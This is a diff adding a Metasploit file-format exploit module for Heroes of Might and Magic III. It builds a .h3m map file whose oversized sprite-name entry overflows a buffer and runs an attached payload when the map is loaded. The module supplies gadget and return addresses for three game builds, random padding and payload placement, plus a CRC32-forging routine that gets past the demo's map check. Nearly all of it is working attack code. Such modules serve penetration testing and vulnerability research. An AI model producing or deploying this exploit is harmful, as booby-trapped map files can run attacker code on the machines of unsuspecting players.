@@ -1,0 +1,321 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+require 'zlib'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::FILEFORMAT
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Heroes of Might and Magic III .h3m Map file Buffer Overflow',
+      'Description'    => %q{
+          This module embeds an exploit into an ucompressed map file (.h3m) for
+        Heroes of Might and Magic III. Once the map is started in-game, a
+        buffer overflow occuring when loading object sprite names leads to
+        shellcode execution.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Pierre Lindblad', # Vulnerability discovery
+          'John AAkerblom'   # Vulnerability discovery, PoC and Metasploit module
+        ],
+      'References'     =>
+        [
+          [ 'EDB', '37716' ]
+        ],
+      'DefaultOptions' =>
+        {
+          'EXITFUNC' => 'process'
+        },
+      'Platform'       => 'win',
+      'Targets'        =>
+        [
+          [
+            'H3 Complete 4.0.0.0  [Heroes3.exe 78956DFAB3EB8DDF29F6A84CF7AD01EE]',
+            {
+              # Two "Anticrash"-gadgets are needed or the game will crash before ret
+              #
+              # Anticrash1, needs to pass the following code down to final JMP:
+              # MOV EAX, DWORD PTR DS : [ESI + 4] ; [Anticrash1 + 4]
+              # XOR EBX, EBX
+              # CMP EAX, EBX
+              # JE SHORT <crash spot> ; JMP to crash if EAX is 0
+              # MOV CL, BYTE PTR DS : [EAX - 1]
+              # CMP CL, BL
+              # JE SHORT <crash spot> ; JMP to crash if the byte before [EAX] is 0
+              # CMP CL, 0FF
+              # JE SHORT <crash spot> ; JMP to crash if the byte before [EAX] is 0xFF
+              # CMP EDI, EBX
+              # JNE <good spot> ; JMP to good spot. Always occurs if we get this far
+              #
+              # Summary: An address which when incremented by 4 and then dereferenced
+              # leads to for example a string which is preceeded neither by a 0x00 or 0xFF
+              'Anticrash1' => 0x004497D4,
+              # Anticrash2, needs to return out of the following call (tricky):
+              #
+              # MOV EAX, DWORD PTR DS : [ECX] ; [Anticrash2]
+              # CALL DWORD PTR DS : [EAX + 4] ; [[Anticrash2] + 4]
+              #
+              # Summary: An address which when dereferenced leads to an address that
+              # when incremented by 4 and then deferenced leads to a function returning
+              # without accessing any registers/memory that would cause a crash.
+              'Anticrash2' => 0x006A6430,
+              'Ret' => 0x004EFF87, # CALL ESP Heroes3.exe
+              'Padding' => 121 # Amount of bytes from exploit's 7 initial 0x00 bytes and saved eip
+            }
+          ],
+          [
+            'HD Mod 3.808 build 9 [Heroes3 HD.exe 56614D31CC6F077C2D511E6AF5619280]',
+            {
+              'Anticrash1' => 0x00456A48,
+              'Anticrash2' => 0x006A6830,
+              'Ret' => 0x00580C0F, # CALL ESP Heroes3 HD.exe
+              'Padding' => 121 # Amount of bytes from exploit's 7 initial 0x00 bytes and saved eip
+            }
+          ],
+          [
+            'Heroes III Demo 1.0.0.0 [h3demo.exe 522B6F45F534058D02A561838559B1F4]',
+            {
+              # The two anticrash gadgets are accessed in reverse order for this target,
+              # meaning that the documentation above for Anticrash1 applies to Anticrash2
+              # here. However, Anticrash1 here is accessed differently than the other targets.
+              # Anticrash1, needs to pass the following code:
+              # CMP BYTE PTR SS:[EBP+5C], 72 ; [Anticrash1 + 0x5C]
+              # JNE 00591F37
+              # MOV EAX,DWORD PTR SS:[EBP+38] ; [Anticrash1 + 0x38]
+              'Anticrash1' => 0x00580C0F, # Coincidentally the Ret value from HD Mod target
+              # Anticrash2, see documentation for Anticrash1 (not 2) in H3 Complete 4.0.0.0 target
+              'Anticrash2' => 0x005CE200,
+              'Ret' => 0x0043EAB1, # CALL ESP h3demo.exe
+              'Padding' => 109, # Amount of bytes from exploit's 7 initial 0x00 bytes and saved eip
+              'CRC32' => 0xFEEFB9EB
+            }
+          ]
+        ],
+      'Privileged'     => false,
+      'DisclosureDate' => 'Jul 29 2015',
+      'DefaultTarget'  => 0))
+
+    register_options(
+      [
+        OptString.new('FILENAME',
+                      [
+                        false,
+                        'If file exists, exploit will be embedded' \
+                          ' into it. If not, a new default h3m file where' \
+                          ' it will be embedded will be created.',
+                        'sploit.h3m'
+                      ])
+      ], self.class)
+  end
+
+  def exploit
+    buf = ''
+
+    # Load h3m into buffer from uncompressed .h3m on disk/default data
+    begin
+      buf << read_file(datastore['FILENAME'])
+      print_status('File ' + datastore['FILENAME'] + ' exists, will embed exploit if possible')
+    rescue Errno::ENOENT
+      print_warning('File ' + datastore['FILENAME'] + ' does not exist, creating new file from ' \
+        'default .h3m data')
+      buf << make_default_h3m
+    end
+
+    # Find the object attributes array in the file by searching for a sprite name that occurs
+    # as the first game object in all maps.
+    objects_pos = buf.index('AVWmrnd0.def')
+    if objects_pos.nil?
+      print_error('Failed to find game object section in file ' + datastore['FILENAME'] + \
+        '. Make sure this file is an uncompressed .h3m (and has not yet had exploit embedded)')
+      return
+    end
+
+    # Entries in the objects array start with a string size followed by game sprite name string
+    # Move back 4 bytes from the first sprite name to get to the start of the objects array
+    objects_pos -= 4
+
+    print_good('Found object attributes array in file at decimal offset ' + objects_pos.to_s)
+
+    # Construct a malicious object entry with a big size, where the sprite name starts
+    # with a NULL terminator and 6 extra 0x00 bytes. The first 2 of those 6 can be anything,
+    # but certain values for the last 4 will cause the CALL-ESP gadget address to be overwritten.
+    # After the 7 0x00 bytes comes 121 bytes of random data and then the CALL ESP-gadget for
+    # overwriting the saved eip. Finally two "anticrash gadgets" that are used by the game before
+    # it returns to the CALL ESP-gadget are required for the game not to crash before returning.
+    size = 7 + target['Padding'] + 4 + 4 + 4 + payload.encoded.size
+    exp = ''
+    exp << [size].pack('V')
+    exp << "\x00" * 7 # The first byte terminates string, next 2 dont matter, last 4 need to be 0
+    exp << rand_text(target['Padding'])
+    exp << [target.ret].pack('V')
+    exp << [target['Anticrash1']].pack('V')
+    exp << [target['Anticrash2']].pack('V')
+    exp << payload.encoded
+
+    # Embed malicious object entry. It is okay if we overwrite the rest of the file and extend buf
+    from = objects_pos
+    to = from + size
+    buf[from..to] = exp
+    print_good('Embedded exploit between decimal file offsets ' + from.to_s + ' and ' + to.to_s)
+
+    # Demo version has a crc32 check to disallow other maps than the one it comes with.
+    if target['CRC32']
+      buf = forge_crc32(buf, target['CRC32'])
+      if Zlib.crc32(buf) == target['CRC32']
+        print_good('Forged CRC32 to 0x%08X by adding 4 bytes at end of file' % target['CRC32'])
+      else
+        print_error('Failed to forge CRC32')
+        return
+      end
+    end
+
+    # Write the uncompressed exploit .h3m (the game can load uncompressed .h3ms)
+    file_create(buf)
+  end
+
+  def substring_pos(string, substring)
+    string.enum_for(:scan, substring).map { $~.offset(0)[0] }
+  end
+
+  #
+  # Loads a file
+  #
+  def read_file(fname)
+    buf = ''
+    ::File.open(fname, 'rb') do |f|
+      buf << f.read
+    end
+
+    buf
+  end
+
+  #
+  # Returns data for a minimimum required S size h3m map containing 2 players
+  #
+  def make_default_h3m
+    buf = ''
+
+    # Set map specifications to 36x36 (0x24000000) map with 2 players, with
+    # default/no settings for name, description, victory condition etc
+    buf << "\x0e\x00\x00\x00\x01\x24\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+    buf << "\x00\x00\x01\x01\x01\x00\x01\x00\x00\x00\xff\x01\x01\x00\x01\x00"
+    buf << "\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x8c"
+    buf << "\x00\x00\xff\x00\x00\x00\x00\xb1\x00\x00\xff\x00\x00\x00\x00\x00"
+    buf << "\x00\x00\xff\x00\x00\x00\x00\x7f\x00\x00\xff\x00\x00\x00\x00\x48"
+    buf << "\x00\x00\xff\xff\xff\x00"
+    buf << "\xFF" * 16
+    buf << "\x00" * 35
+
+    # Each tile is 7 bytes, fill map with empty dirt tiles (0x00)
+    buf << "\x00" * (36 * 36 * 7)
+
+    # Set object attribute array count to 1
+    buf << "\x01\x00\x00\x00"
+
+    # Size of first sprite name, this will be overwritten
+    buf << "\x12\x34\x56\x78"
+
+    # Standard name for first object, which will be searched for
+    buf << 'AVWmrnd0.def'
+
+    buf
+  end
+
+  #
+  # Forge crc32 by adding 4 bytes at the end of data
+  # http://blog.stalkr.net/2011/03/crc-32-forging.html
+  #
+  def forge_crc32(data, wanted_crc)
+    crc32_reverse = [
+      0x00000000, 0xDB710641, 0x6D930AC3, 0xB6E20C82,
+      0xDB261586, 0x005713C7, 0xB6B51F45, 0x6DC41904,
+      0x6D3D2D4D, 0xB64C2B0C, 0x00AE278E, 0xDBDF21CF,
+      0xB61B38CB, 0x6D6A3E8A, 0xDB883208, 0x00F93449,
+      0xDA7A5A9A, 0x010B5CDB, 0xB7E95059, 0x6C985618,
+      0x015C4F1C, 0xDA2D495D, 0x6CCF45DF, 0xB7BE439E,
+      0xB74777D7, 0x6C367196, 0xDAD47D14, 0x01A57B55,
+      0x6C616251, 0xB7106410, 0x01F26892, 0xDA836ED3,
+      0x6F85B375, 0xB4F4B534, 0x0216B9B6, 0xD967BFF7,
+      0xB4A3A6F3, 0x6FD2A0B2, 0xD930AC30, 0x0241AA71,
+      0x02B89E38, 0xD9C99879, 0x6F2B94FB, 0xB45A92BA,
+      0xD99E8BBE, 0x02EF8DFF, 0xB40D817D, 0x6F7C873C,
+      0xB5FFE9EF, 0x6E8EEFAE, 0xD86CE32C, 0x031DE56D,
+      0x6ED9FC69, 0xB5A8FA28, 0x034AF6AA, 0xD83BF0EB,
+      0xD8C2C4A2, 0x03B3C2E3, 0xB551CE61, 0x6E20C820,
+      0x03E4D124, 0xD895D765, 0x6E77DBE7, 0xB506DDA6,
+      0xDF0B66EA, 0x047A60AB, 0xB2986C29, 0x69E96A68,
+      0x042D736C, 0xDF5C752D, 0x69BE79AF, 0xB2CF7FEE,
+      0xB2364BA7, 0x69474DE6, 0xDFA54164, 0x04D44725,
+      0x69105E21, 0xB2615860, 0x048354E2, 0xDFF252A3,
+      0x05713C70, 0xDE003A31, 0x68E236B3, 0xB39330F2,
+      0xDE5729F6, 0x05262FB7, 0xB3C42335, 0x68B52574,
+      0x684C113D, 0xB33D177C, 0x05DF1BFE, 0xDEAE1DBF,
+      0xB36A04BB, 0x681B02FA, 0xDEF90E78, 0x05880839,
+      0xB08ED59F, 0x6BFFD3DE, 0xDD1DDF5C, 0x066CD91D,
+      0x6BA8C019, 0xB0D9C658, 0x063BCADA, 0xDD4ACC9B,
+      0xDDB3F8D2, 0x06C2FE93, 0xB020F211, 0x6B51F450,
+      0x0695ED54, 0xDDE4EB15, 0x6B06E797, 0xB077E1D6,
+      0x6AF48F05, 0xB1858944, 0x076785C6, 0xDC168387,
+      0xB1D29A83, 0x6AA39CC2, 0xDC419040, 0x07309601,
+      0x07C9A248, 0xDCB8A409, 0x6A5AA88B, 0xB12BAECA,
+      0xDCEFB7CE, 0x079EB18F, 0xB17CBD0D, 0x6A0DBB4C,
+      0x6567CB95, 0xBE16CDD4, 0x08F4C156, 0xD385C717,
+      0xBE41DE13, 0x6530D852, 0xD3D2D4D0, 0x08A3D291,
+      0x085AE6D8, 0xD32BE099, 0x65C9EC1B, 0xBEB8EA5A,
+      0xD37CF35E, 0x080DF51F, 0xBEEFF99D, 0x659EFFDC,
+      0xBF1D910F, 0x646C974E, 0xD28E9BCC, 0x09FF9D8D,
+      0x643B8489, 0xBF4A82C8, 0x09A88E4A, 0xD2D9880B,
+      0xD220BC42, 0x0951BA03, 0xBFB3B681, 0x64C2B0C0,
+      0x0906A9C4, 0xD277AF85, 0x6495A307, 0xBFE4A546,
+      0x0AE278E0, 0xD1937EA1, 0x67717223, 0xBC007462,
+      0xD1C46D66, 0x0AB56B27, 0xBC5767A5, 0x672661E4,
+      0x67DF55AD, 0xBCAE53EC, 0x0A4C5F6E, 0xD13D592F,
+      0xBCF9402B, 0x6788466A, 0xD16A4AE8, 0x0A1B4CA9,
+      0xD098227A, 0x0BE9243B, 0xBD0B28B9, 0x667A2EF8,
+      0x0BBE37FC, 0xD0CF31BD, 0x662D3D3F, 0xBD5C3B7E,
+      0xBDA50F37, 0x66D40976, 0xD03605F4, 0x0B4703B5,
+      0x66831AB1, 0xBDF21CF0, 0x0B101072, 0xD0611633,
+      0xBA6CAD7F, 0x611DAB3E, 0xD7FFA7BC, 0x0C8EA1FD,
+      0x614AB8F9, 0xBA3BBEB8, 0x0CD9B23A, 0xD7A8B47B,
+      0xD7518032, 0x0C208673, 0xBAC28AF1, 0x61B38CB0,
+      0x0C7795B4, 0xD70693F5, 0x61E49F77, 0xBA959936,
+      0x6016F7E5, 0xBB67F1A4, 0x0D85FD26, 0xD6F4FB67,
+      0xBB30E263, 0x6041E422, 0xD6A3E8A0, 0x0DD2EEE1,
+      0x0D2BDAA8, 0xD65ADCE9, 0x60B8D06B, 0xBBC9D62A,
+      0xD60DCF2E, 0x0D7CC96F, 0xBB9EC5ED, 0x60EFC3AC,
+      0xD5E91E0A, 0x0E98184B, 0xB87A14C9, 0x630B1288,
+      0x0ECF0B8C, 0xD5BE0DCD, 0x635C014F, 0xB82D070E,
+      0xB8D43347, 0x63A53506, 0xD5473984, 0x0E363FC5,
+      0x63F226C1, 0xB8832080, 0x0E612C02, 0xD5102A43,
+      0x0F934490, 0xD4E242D1, 0x62004E53, 0xB9714812,
+      0xD4B55116, 0x0FC45757, 0xB9265BD5, 0x62575D94,
+      0x62AE69DD, 0xB9DF6F9C, 0x0F3D631E, 0xD44C655F,
+      0xB9887C5B, 0x62F97A1A, 0xD41B7698, 0x0F6A70D9
+    ]
+
+    # forward calculation of CRC up to pos, sets current forward CRC state
+    fwd_crc = 0xffffffff
+    data.each_byte do |c|
+      fwd_crc = (fwd_crc >> 8) ^ Zlib.crc_table[(fwd_crc ^ c) & 0xff]
+    end
+
+    # backward calculation of CRC up to pos, sets wanted backward CRC state
+    bkd_crc = wanted_crc ^ 0xffffffff
+
+    # deduce the 4 bytes we need to insert
+    [fwd_crc].pack('<L').each_byte.reverse_each do |c|
+      bkd_crc = ((bkd_crc << 8) & 0xffffffff) ^ crc32_reverse[bkd_crc >> 24] ^ c
+    end
+
+    res = data + [bkd_crc].pack('<L')
+    res
+  end
+end
